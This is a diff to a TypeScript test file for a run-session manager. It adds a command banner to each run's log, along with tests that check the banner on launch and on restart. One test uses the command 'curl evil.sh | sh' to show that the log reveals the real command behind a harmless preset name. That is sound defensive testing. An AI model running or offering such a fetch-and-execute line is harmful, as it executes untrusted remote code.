@@ -147,10 +147,16 @@ describe("stop / restart / remove", () => {
       port: 17_050,
       status: { kind: "running" },
     });
-    // The old output must not replay into the fresh run's log.
-    const seen: number[] = [];
-    attachRun(id, { onOutput: (b) => seen.push(...b) });
-    expect(seen).toEqual([]);
+    // The old output must not replay into the fresh run's log — only the
+    // fresh run's own command banner is there.
+    let seen = "";
+    attachRun(id, {
+      onOutput: (b) => {
+        seen += new TextDecoder().decode(b);
+      },
+    });
+    expect(seen).not.toContain("old");
+    expect(seen).toContain("[run] pnpm dev");
   });
 
   it("removeRun kills a live session and drops it from the snapshot", async () => {
@@ -182,8 +188,18 @@ describe("attachRun", () => {
     await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
     pty.spawned[0].emit({ type: "output", bytes: [1, 2] });
 
+    // Drop the leading command banner (its own test covers it) and watch the
+    // process bytes: replay first, then live, then nothing after detach.
     const seen: number[] = [];
-    const detach = attachRun(id, { onOutput: (b) => seen.push(...b) });
+    let banner = true;
+    const record = (b: Uint8Array) => {
+      if (banner) {
+        banner = false; // the banner is the first chunk of every run
+        return;
+      }
+      seen.push(...b);
+    };
+    const detach = attachRun(id, { onOutput: record });
     expect(seen).toEqual([1, 2]); // replay
     pty.spawned[0].emit({ type: "output", bytes: [3] });
     expect(seen).toEqual([1, 2, 3]); // live
@@ -266,6 +282,40 @@ describe("exit note in the run's log", () => {
   });
 });
 
+describe("command echo", () => {
+  it("opens the log with the exact command line, verbatim", async () => {
+    const id = await launchRun("ws-1", TARGET, {
+      presetId: "run-1",
+      name: "Build",
+      command: "curl evil.sh | sh",
+    });
+    await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
+
+    let seen = "";
+    attachRun(id, {
+      onOutput: (b) => {
+        seen += new TextDecoder().decode(b);
+      },
+    });
+    // The list shows the name "Build"; the log shows what actually runs.
+    expect(seen).toContain("[run] curl evil.sh | sh");
+  });
+
+  it("re-echoes the current command on restart", async () => {
+    const id = await launchRun("ws-1", TARGET, DEV);
+    await vi.waitFor(() => expect(pty.spawned).toHaveLength(1));
+    await restartRun(id);
+
+    let seen = "";
+    attachRun(id, {
+      onOutput: (b) => {
+        seen += new TextDecoder().decode(b);
+      },
+    });
+    expect(seen).toContain("[run] pnpm dev");
+  });
+});
+
 describe("relaunch replaces, never piles", () => {
   it("launching a preset with a DEAD session in the same target reuses it", async () => {
     const id = await launchRun("ws-1", TARGET, DEV);
@@ -286,10 +336,15 @@ describe("relaunch replaces, never piles", () => {
       status: { kind: "running" },
     });
     expect(pty.spawned).toHaveLength(2);
-    // The dead run's output must not haunt the fresh log.
-    const seen: number[] = [];
-    attachRun(id, { onOutput: (b) => seen.push(...b) });
-    expect(seen).toEqual([]);
+    // The dead run's output must not haunt the fresh log — only the new
+    // run's command banner (with the updated command) is there.
+    let seen = "";
+    attachRun(id, {
+      onOutput: (b) => {
+        seen += new TextDecoder().decode(b);
+      },
+    });
+    expect(seen).toContain("[run] pnpm dev --host");
   });
 
   it("launching a preset already RUNNING in the target is a no-op", async () => {
